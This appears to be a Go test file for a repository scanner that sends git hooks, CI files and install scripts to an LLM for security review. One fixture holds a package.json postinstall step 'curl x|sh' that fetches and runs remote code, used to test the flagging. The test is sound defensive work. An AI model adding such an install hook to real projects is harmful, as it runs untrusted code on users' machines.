package scan

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

type staticSource struct {
	files map[string][]byte
	names []string
}

func (s staticSource) file(p string) []byte { return s.files[p] }
func (s staticSource) list() []string       { return s.names }

func TestGatherLocalLLMInput(t *testing.T) {
	root := makeRepo(t, "[core]\n\trepositoryformatversion = 0\n")
	writeFile(t, filepath.Join(root, ".git", "hooks", "post-checkout"), "#!/bin/sh\necho hi\n")
	writeFile(t, filepath.Join(root, "package.json"), `{"scripts":{"postinstall":"node x.js"}}`)
	writeFile(t, filepath.Join(root, "README.md"), "hello\n")
	writeFile(t, filepath.Join(root, "blob.bin"), "\x00\x01\x02")

	repo, _, err := scanRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	files, listing := gatherLLMInput(newLocalSource(repo), localHooksDir(repo))

	got := map[string]string{}
	for _, f := range files {
		got[f.Path] = f.Content
	}
	for _, want := range []string{".git/config", ".git/hooks/post-checkout", "package.json"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing file %q, have %v", want, keysOf(got))
		}
	}
	if _, ok := got["README.md"]; ok {
		t.Error("README.md must be listing-only")
	}
	if _, ok := got["blob.bin"]; ok {
		t.Error("binary file must be skipped")
	}
	if !hasString(listing, "README.md") {
		t.Errorf("listing missing README.md: %v", listing)
	}
}

func TestGatherLocalLLMCustomHooksPath(t *testing.T) {
	root := makeRepo(t, "[core]\n\thooksPath = myhooks\n")
	writeFile(t, filepath.Join(root, "myhooks", "pre-commit"), "#!/bin/sh\necho hi\n")

	repo, _, err := scanRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	files, _ := gatherLLMInput(newLocalSource(repo), localHooksDir(repo))

	if got := localHooksDir(repo); got != "myhooks" {
		t.Fatalf("localHooksDir = %q, want myhooks", got)
	}
	found := false
	for _, f := range files {
		if f.Path == "myhooks/pre-commit" {
			found = true
		}
	}
	if !found {
		t.Errorf("custom hooksPath file not gathered: %+v", files)
	}
}

func TestLLMSelected(t *testing.T) {
	yes := []string{
		".git/config",
		".github/workflows/ci.yml",
		"Makefile",
		"Dockerfile.prod",
		"deploy.sh",
		"scripts/build.sh",
		".husky/pre-commit",
		".githooks/post-checkout",
		"myhooks/pre-commit",
	}
	for _, p := range yes {
		if !llmSelected(p, "myhooks") {
			t.Errorf("llmSelected(%q) = false, want true", p)
		}
	}
	no := []string{"README.md", "src/main.go", "docs/guide.md", "assets/logo.png", "yarn.lock"}
	for _, p := range no {
		if llmSelected(p, "myhooks") {
			t.Errorf("llmSelected(%q) = true, want false", p)
		}
	}
}

func TestCapBytes(t *testing.T) {
	if got := string(capBytes([]byte("abc"), 10)); got != "abc" {
		t.Errorf("capBytes under limit = %q", got)
	}
	got := string(capBytes([]byte("abcdef"), 3))
	if !strings.HasPrefix(got, "abc") || !strings.Contains(got, "truncated") {
		t.Errorf("capBytes over limit = %q", got)
	}
}

func TestScanLLMSourceAddsFindings(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeChatReply(w, `{"findings":[{"severity":"critical","path":"package.json","title":"postinstall runs curl"}]}`)
	}))
	defer srv.Close()

	src := staticSource{
		files: map[string][]byte{"package.json": []byte(`{"scripts":{"postinstall":"curl x|sh"}}`)},
		names: []string{"package.json"},
	}
	var findings []Finding
	var stderr bytes.Buffer
	note := scanLLMSource(llmConfig{baseURL: srv.URL, model: "m"}, src, "", &stderr,
		func(f Finding) { findings = append(findings, f) })

	if len(findings) != 1 || findings[0].Title != "LLM: postinstall runs curl" {
		t.Errorf("findings = %+v (stderr %q)", findings, stderr.String())
	}
	if !strings.Contains(note, "LLM review read") {
		t.Errorf("note = %q, want it to report the reviewed files", note)
	}
}

func TestScanLLMSourceWarnsOnError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	defer srv.Close()

	src := staticSource{files: map[string][]byte{"package.json": []byte("{}")}, names: []string{"package.json"}}
	var findings []Finding
	var stderr bytes.Buffer
	note := scanLLMSource(llmConfig{baseURL: srv.URL, model: "m"}, src, "", &stderr,
		func(f Finding) { findings = append(findings, f) })

	if len(findings) != 0 {
		t.Errorf("findings = %+v", findings)
	}
	if !strings.Contains(note, "LLM review skipped") {
		t.Errorf("note = %q, want it to say the review was skipped", note)
	}
	if !strings.Contains(note, "checks above ran without it") {
		t.Errorf("note = %q, want it to say the scan still finished", note)
	}
}

// TestLLMNoteForTimeout checks a timeout gets its own wording, because the fix
// is a longer wait and not a different endpoint.
func TestLLMNoteForTimeout(t *testing.T) {
	note := llmNote(llmConfig{timeout: 90 * time.Second}, &timeoutError{})

	for _, want := range []string{"timed out after 1m30s", llmEnvTimeout, "10m"} {
		if !strings.Contains(note, want) {
			t.Errorf("note = %q, want it to contain %q", note, want)
		}
	}
	if strings.Contains(note, "context deadline exceeded") {
		t.Errorf("note = %q, want the transport error left out", note)
	}
}

// timeoutError stands in for the transport error a real timeout produces.
type timeoutError struct{}

func (*timeoutError) Error() string { return "context deadline exceeded" }

func (*timeoutError) Timeout() bool { return true }

func (*timeoutError) Temporary() bool { return true }

func TestLLMWaitFromEnv(t *testing.T) {
	t.Setenv(llmEnvTimeout, "45s")
	if got := llmWait(); got != 45*time.Second {
		t.Errorf("llmWait() = %s, want 45s", got)
	}
	t.Setenv(llmEnvTimeout, "nonsense")
	if got := llmWait(); got != defaultLLMTimeout {
		t.Errorf("llmWait() = %s, want the default for an unusable value", got)
	}
	t.Setenv(llmEnvTimeout, "")
	if got := llmWait(); got != defaultLLMTimeout {
		t.Errorf("llmWait() = %s, want the default when unset", got)
	}
}

func keysOf(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func hasString(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}
